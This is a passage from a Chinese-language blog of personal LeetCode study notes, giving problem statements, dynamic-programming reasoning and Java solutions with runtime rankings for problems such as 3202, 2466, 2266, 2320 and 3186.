<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">oddCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">evenCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">up</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">down</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">             <span class="keyword">if</span>(num % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                 evenCount ++;</span><br><span class="line">                 down = up + <span class="number">1</span>;</span><br><span class="line">             &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 oddCount ++;</span><br><span class="line">                 up = down + <span class="number">1</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> Integer.max(Integer.max(oddCount, evenCount), Integer.max(up, down));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h4><p>讲的是更普遍的情况，下道题分析</p>
<p>参考：<a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-ii/solutions/2826591/deng-jie-zhuan-huan-dong-tai-gui-hua-pyt-z2fs/">3202. 找出有效子序列的最大长度 II - 力扣（LeetCode）</a></p>
<h3 id="3202-找出有效子序列的最大长度-II"><a href="#3202-找出有效子序列的最大长度-II" class="headerlink" title="3202. 找出有效子序列的最大长度 II"></a><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-ii/">3202. 找出有效子序列的最大长度 II</a></h3><h4 id="题干-2"><a href="#题干-2" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个整数数组 nums 和一个 正 整数 k 。</span><br><span class="line">nums 的一个 </span><br><span class="line">子序列</span><br><span class="line"> sub 的长度为 x ，如果其满足以下条件，则称其为 有效子序列 ：</span><br><span class="line"></span><br><span class="line">(sub[0] + sub[1]) % k == (sub[1] + sub[2]) % k == ... == (sub[x - 2] + sub[x - 1]) % k</span><br><span class="line">返回 nums 的 最长有效子序列 的长度。</span><br></pre></td></tr></table></figure>

<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp。</span><br><span class="line">初始化数组dp[k][k] .</span><br><span class="line">其中dp[i][j]表示子序列</span><br><span class="line">则有</span><br><span class="line">for x in nums:</span><br><span class="line">	x = x%k </span><br><span class="line">	dp[x][y] = dp[y][x] + 1</span><br></pre></td></tr></table></figure>

<p>复杂度o(n2)不知道会不会被卡，提交试试吧</p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maximumLength(int[] nums, int k) &#123;</span><br><span class="line">        int res = 0;</span><br><span class="line">        int[][] dp = new int[k][k];</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            int numModK = num % k;</span><br><span class="line">            for (int y = 0; y &lt; k; y++) &#123;</span><br><span class="line">                dp[y][numModK] = dp[numModK][y] + 1;</span><br><span class="line">                res = Math.max(res, dp[y][numModK]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3203-合并两棵树后的最小直径"><a href="#3203-合并两棵树后的最小直径" class="headerlink" title="3203. 合并两棵树后的最小直径"></a><a href="https://leetcode.cn/problems/find-minimum-diameter-after-merging-two-trees/">3203. 合并两棵树后的最小直径</a></h3><p>todo</p>
<p>周赛专题结束-现在是dp。每周两道</p>
<p><a href="https://leetcode.cn/circle/discuss/tXLS3i/">分享丨【题单】动态规划（入门&#x2F;背包&#x2F;状态机&#x2F;划分&#x2F;区间&#x2F;状压&#x2F;数位&#x2F;树形&#x2F;数据结构优化） - 力扣（LeetCode）</a></p>
<h2 id="入门dp"><a href="#入门dp" class="headerlink" title="入门dp"></a>入门dp</h2><h3 id="2466-统计构造好字符串的方案数"><a href="#2466-统计构造好字符串的方案数" class="headerlink" title="2466. 统计构造好字符串的方案数"></a><a href="https://leetcode.cn/problems/count-ways-to-build-good-strings/">2466. 统计构造好字符串的方案数</a></h3><h4 id="题干-3"><a href="#题干-3" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你整数 zero ，one ，low 和 high ，我们从空字符串开始构造一个字符串，每一步执行下面操作中的一种：</span><br><span class="line"></span><br><span class="line">将 &#x27;0&#x27; 在字符串末尾添加 zero  次。</span><br><span class="line">将 &#x27;1&#x27; 在字符串末尾添加 one 次。</span><br><span class="line">以上操作可以执行任意次。</span><br><span class="line"></span><br><span class="line">如果通过以上过程得到一个 长度 在 low 和 high 之间（包含上下边界）的字符串，那么这个字符串我们称为 好 字符串。</span><br><span class="line"></span><br><span class="line">请你返回满足以上要求的 不同 好字符串数目。由于答案可能很大，请将结果对 109 + 7 取余 后返回。</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">既然是dp专题，那肯定就dp分析了。</span><br><span class="line">请你返回满足以上要求的 不同 好字符串数目。由于答案可能很大，请将结果对 109 + 7 取余 后返回。 看到这个结果大小也一般都是dp了</span><br><span class="line"></span><br><span class="line">感觉就是走楼梯</span><br><span class="line">zero就是走 zero步楼梯，one就是走one步楼梯</span><br><span class="line">因此</span><br><span class="line">res = 0</span><br><span class="line">minVal = min(zero, one)</span><br><span class="line">maxVal = max(zero, one)</span><br><span class="line"></span><br><span class="line">初始化</span><br><span class="line">dp[j] = dp[j - maxVal] + dp[j - minVal] % (1e9 + 7)</span><br></pre></td></tr></table></figure>

<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countGoodStrings</span><span class="params">(<span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> zero, <span class="type">int</span> one)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.min(zero, one);</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> Integer.max(zero, one);</span><br><span class="line">        <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> [] dp = <span class="keyword">new</span> <span class="title class_">int</span>[high + <span class="number">1</span>];</span><br><span class="line">        dp[minVal] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> minVal * <span class="number">2</span>; j &lt; maxVal; j++)&#123;</span><br><span class="line">            dp[j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxVal % minVal == <span class="number">0</span>)&#123;</span><br><span class="line">            dp[maxVal] = <span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            dp[maxVal] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxVal == low)&#123;</span><br><span class="line">            res += dp[maxVal];</span><br><span class="line">            res %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> maxVal + <span class="number">1</span>; j &lt;= high; j++)&#123;</span><br><span class="line">            dp[j] = dp[j - maxVal] + dp[j - minVal];</span><br><span class="line">            dp[j] %= modNum;</span><br><span class="line">            <span class="keyword">if</span>(j &gt;= low )&#123;</span><br><span class="line">                res += dp[j];</span><br><span class="line">                res %= modNum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行用时:100%</p>
<p>内存：82.66%</p>
<h3 id="2266-统计打字方案数"><a href="#2266-统计打字方案数" class="headerlink" title="2266. 统计打字方案数"></a><a href="https://leetcode.cn/problems/count-number-of-texts/">2266. 统计打字方案数</a></h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分析下发现只需要提取出字符串连续字符的个数，然后结果相乘就好</span><br><span class="line">举个例子</span><br><span class="line">&quot;22233&quot;</span><br><span class="line">分成两部分</span><br><span class="line">222 和 33</span><br><span class="line">然后</span><br><span class="line">222 可以dp计算 dp[1]=&gt;dp[0] dp[2]=dp[0]+dp[1] dp[3]=&gt;dp[0]+ dp[1] + dp[2]即1=&gt;1 2=&gt; 2 3=&gt;4</span><br><span class="line">同理33 1=&gt;1 2=&gt;2</span><br><span class="line">4*2 = 8</span><br><span class="line"></span><br><span class="line">因此其实题目就是爬楼梯</span><br><span class="line">具体过程看代码</span><br><span class="line"></span><br><span class="line">压下空间吧</span><br></pre></td></tr></table></figure>

<h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countTexts</span><span class="params">(String pressedKeys)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">    List&lt;Integer&gt; twoCount = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; nineCount = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; pressedKeys.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pressedKeys.charAt(i) != pressedKeys.charAt(i - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pressedKeys.charAt(i - <span class="number">1</span>) != <span class="string">&#x27;7&#x27;</span> &amp;&amp; pressedKeys.charAt(i - <span class="number">1</span>) != <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                twoCount.add(count);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nineCount.add(count);</span><br><span class="line">            &#125;</span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pressedKeys.charAt(pressedKeys.length() - <span class="number">1</span>) != <span class="string">&#x27;7&#x27;</span> &amp;&amp; pressedKeys.charAt(pressedKeys.length() - <span class="number">1</span>) != <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        twoCount.add(count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nineCount.add(count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxTwoLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxNineLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!twoCount.isEmpty()) &#123;</span><br><span class="line">        maxTwoLength = Collections.max(twoCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!nineCount.isEmpty()) &#123;</span><br><span class="line">        maxNineLength = Collections.max(nineCount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dpForNumTwo = <span class="keyword">new</span> <span class="title class_">int</span>[Integer.max(maxTwoLength + <span class="number">1</span>, <span class="number">3</span> + <span class="number">1</span>)];<span class="comment">//省去麻烦</span></span><br><span class="line">    <span class="type">int</span>[] dpForNumNine = <span class="keyword">new</span> <span class="title class_">int</span>[Integer.max(maxNineLength + <span class="number">1</span>, <span class="number">4</span> + <span class="number">1</span>)];<span class="comment">//省去麻烦,之后就不用if判断了</span></span><br><span class="line">    dpForNumTwo[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    dpForNumTwo[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    dpForNumNine[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumNine[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dpForNumNine[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    dpForNumNine[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">    dpForNumNine[<span class="number">4</span>] = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">4</span>; i &lt;= maxTwoLength; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= <span class="number">3</span>; j++) &#123;</span><br><span class="line">            dpForNumTwo[i] += dpForNumTwo[i - j];</span><br><span class="line">            dpForNumTwo[i] %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>; i &lt;= maxNineLength; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= <span class="number">4</span>; j++) &#123;</span><br><span class="line">            dpForNumNine[i] += dpForNumNine[i - j];</span><br><span class="line">            dpForNumNine[i] %= modNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : twoCount) &#123;</span><br><span class="line">        res = res * dpForNumTwo[num];</span><br><span class="line">        res %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : nineCount) &#123;</span><br><span class="line">        res = res * dpForNumNine[num];</span><br><span class="line">        res %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时击败:81.02%</p>
<p>内存击败:87.46%</p>
<h3 id="2320-统计放置房子的方式数"><a href="#2320-统计放置房子的方式数" class="headerlink" title="2320. 统计放置房子的方式数"></a><a href="https://leetcode.cn/problems/count-number-of-ways-to-place-houses/">2320. 统计放置房子的方式数</a></h3><h4 id="题干-4"><a href="#题干-4" class="headerlink" title="题干"></a>题干</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">一条街道上共有 n * <span class="number">2</span> 个 地块 ，街道的两侧各有 n 个地块。每一边的地块都按从 <span class="number">1</span> 到 n 编号。每个地块上都可以放置一所房子。</span><br><span class="line"></span><br><span class="line">现要求街道同一侧不能存在两所房子相邻的情况，请你计算并返回放置房屋的方式数目。由于答案可能很大，需要对 <span class="number">109</span> + <span class="number">7</span> 取余后再返回。</span><br><span class="line"></span><br><span class="line">注意，如果一所房子放置在这条街某一侧上的第 i 个地块，不影响在另一侧的第 i 个地块放置房子。</span><br></pre></td></tr></table></figure>

<h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先肯定是dp，从所在题单和数据需要模数都可以看出</span><br><span class="line"></span><br><span class="line">一个地块只有两个状态，有房子无房子</span><br><span class="line">任何情况都可以选无房子</span><br><span class="line">如果需要选择有房子的话，需要左边一个没有房子（我们从左往右选房子）</span><br><span class="line">设置dp[n+1]数组</span><br><span class="line">初始化dp[0]=1</span><br><span class="line">dp[j]表示总共有j个地块且第j个地块放房子的方案数</span><br><span class="line">递推公式：</span><br><span class="line">dp[j] = sum(dp[i]) for i in [0, j - 2]</span><br><span class="line">res = dp[j](最后放房子) + dp[j-1] (最后不放房子)</span><br><span class="line">最后发现只需要前面两个状态。压缩下空间。详细见代码</span><br></pre></td></tr></table></figure>

<h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countHousePlacements</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">modNum</span> <span class="operator">=</span> <span class="number">1000000000</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sumOne</span> <span class="operator">=</span> <span class="number">2</span>;<span class="comment">//2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sumTwo</span> <span class="operator">=</span> <span class="number">3</span>;<span class="comment">//3</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">3</span>; j &lt; n; j++)&#123;</span><br><span class="line">        cur = sumOne;</span><br><span class="line">        <span class="comment">//更新sumOne、sumTwo</span></span><br><span class="line">        sumOne = sumTwo;</span><br><span class="line">        sumTwo = cur + sumTwo;</span><br><span class="line">        sumTwo %= modNum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> sumOne + sumTwo;</span><br><span class="line">    res %= modNum;</span><br><span class="line">    res = (res * res) % modNum;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span> )res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时97.82%</p>
<p>内存59.30%</p>
<h3 id="3186-施咒的最大总伤害"><a href="#3186-施咒的最大总伤害" class="headerlink" title="3186. 施咒的最大总伤害"></a><a href="https://leetcode.cn/problems/maximum-total-damage-with-spell-casting/">3186. 施咒的最大总伤害</a></h3><h4 id="题干-5"><a href="#题干-5" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个魔法师有许多不同的咒语。</span><br><span class="line"></span><br><span class="line">给你一个数组 power ，其中每个元素表示一个咒语的伤害值，可能会有多个咒语有相同的伤害值。</span><br><span class="line"></span><br><span class="line">已知魔法师使用伤害值为 power[i] 的咒语时，他们就 不能 使用伤害为 power[i] - 2 ，power[i] - 1 ，power[i] + 1 或者 power[i] + 2 的咒语。</span><br><span class="line"></span><br><span class="line">每个咒语最多只能被使用 一次 。</span><br><span class="line"></span><br><span class="line">请你返回这个魔法师可以达到的伤害值之和的 最大值 。</span><br></pre></td></tr></table></figure>

<h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里分析一下打家劫舍，为什么这样定义https://leetcode.cn/problems/house-robber/solutions/138131/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/</span><br><span class="line">int rob(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    if (nums.size() == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    // 子问题：</span><br><span class="line">    // f(k) = 偷 [0..k) 房间中的最大金额</span><br><span class="line"></span><br><span class="line">    // f(0) = 0</span><br><span class="line">    // f(1) = nums[0]</span><br><span class="line">    // f(k) = max&#123; rob(k-1), nums[k-1] + rob(k-2) &#125;</span><br><span class="line"></span><br><span class="line">    int N = nums.size();</span><br><span class="line">    vector&lt;int&gt; dp(N+1, 0);</span><br><span class="line">    dp[0] = 0;</span><br><span class="line">    dp[1] = nums[0];</span><br><span class="line">    for (int k = 2; k &lt;= N; k++) &#123;</span><br><span class="line">        dp[k] = max(dp[k-1], nums[k-1] + dp[k-2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return dp[N];</span><br><span class="line">&#125;</span><br><span class="line">按照我个人的理解的话，我会将的dp数组定义为dp[j]表示打劫了第j家取得的最大收益</span><br><span class="line">于是有dp[k] = max(dp[k-2], dp[k-3]) + nums[k-1]</span><br><span class="line">然后结果为max(dp[N], dp[N-1])。</span><br><span class="line">但是我们看对应的题解，用的递推公式为:</span><br><span class="line">dp[k] = max(dp[k-1], nums[k-1] + dp[k-2]); 即k这个地方即可以偷，又可以不偷。分析下也可以知道确实可以这样设定，这也告诉了我不一定非要局限于某个数取不取的问题。子问题不一定不要完全不相交</span><br><span class="line"></span><br><span class="line">分析本题，肯定先对数组排序，然后还是相似做法。</span><br></pre></td></tr></table></figure>

<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumTotalDamage</span><span class="params">(<span class="type">int</span>[] power)</span> &#123;</span><br><span class="line">    Arrays.sort(power);</span><br><span class="line">    <span class="type">long</span> <span class="variable">curCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录之前的结果和数</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes1</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//dp[j-3]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum1</span> <span class="operator">=</span> -<span class="number">10</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes2</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//dp[j - 2]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum2</span> <span class="operator">=</span> -<span class="number">7</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preRes3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">preNum3</span> <span class="operator">=</span> -<span class="number">5</span>;<span class="comment">//dp[j - 1]</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">curVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; power.length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        curCount += power[i];</span><br><span class="line">        <span class="keyword">if</span>(power[i] != power[i + <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(power[i] - preNum3 &gt; <span class="number">2</span>)&#123;</span><br><span class="line">                curVal = preRes3 + curCount;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(power[i] - preNum3 == <span class="number">2</span>)&#123;</span><br><span class="line">                curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(power[i] - preNum2 == <span class="number">2</span>)&#123;</span><br><span class="line">                    curVal = Long.max(preRes3, preRes1 + curCount);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">long</span> <span class="variable">tempRes</span> <span class="operator">=</span> preRes3;</span><br><span class="line">            <span class="type">long</span> <span class="variable">tempNum</span> <span class="operator">=</span> preNum3;</span><br><span class="line">            preRes3 = curVal;</span><br><span class="line">            preNum3 = power[i];</span><br><span class="line">            preNum1 = preNum2;</span><br><span class="line">            preRes1 = preRes2;</span><br><span class="line">            preNum2 = tempNum;</span><br><span class="line">            preRes2 = tempRes;</span><br><span class="line">            curCount = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> power.length - <span class="number">1</span>;</span><br><span class="line">    curCount += power[i];</span><br><span class="line">    <span class="keyword">if</span>(power[i] - preNum3 &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        curVal = preRes3 + curCount;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(power[i] - preNum3 == <span class="number">2</span>)&#123;</span><br><span class="line">        curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(power[i] - preNum2 == <span class="number">2</span>)&#123;</span><br><span class="line">            curVal = Long.max(preRes3, preRes1 + curCount);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            curVal = Long.max(preRes3, preRes2 + curCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> curVal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时96.66%</p>
<p>内存52.88%</p>
<h4 id="题解代码学习"><a href="#题解代码学习" class="headerlink" title="题解代码学习"></a>题解代码学习</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maximumTotalDamage</span><span class="params">(<span class="type">int</span>[] power)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; cnt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : power) &#123;</span><br><span class="line">            cnt.merge(x, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> cnt.size();</span><br><span class="line">        <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : cnt.keySet()) &#123;</span><br><span class="line">            a[k++] = x;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span>[] f = <span class="keyword">new</span> <span class="title class_">long</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> a[i];</span><br><span class="line">            <span class="keyword">while</span> (a[j] &lt; x - <span class="number">2</span>) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            f[i + <span class="number">1</span>] = Math.max(f[i], f[j] + (<span class="type">long</span>) x * cnt.get(x));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：灵茶山艾府</span><br><span class="line">链接：https:<span class="comment">//leetcode.cn/problems/maximum-total-damage-with-spell-casting/solutions/2812389/tao-lu-da-jia-jie-she-pythonjavacgo-by-e-p9b5/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>

<h3 id="2606-找到最大开销的子字符串"><a href="#2606-找到最大开销的子字符串" class="headerlink" title="2606. 找到最大开销的子字符串"></a><a href="https://leetcode.cn/problems/find-the-substring-with-maximum-cost/">2606. 找到最大开销的子字符串</a></h3><h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">最大子数组和变式</span><br></pre></td></tr></table></figure>

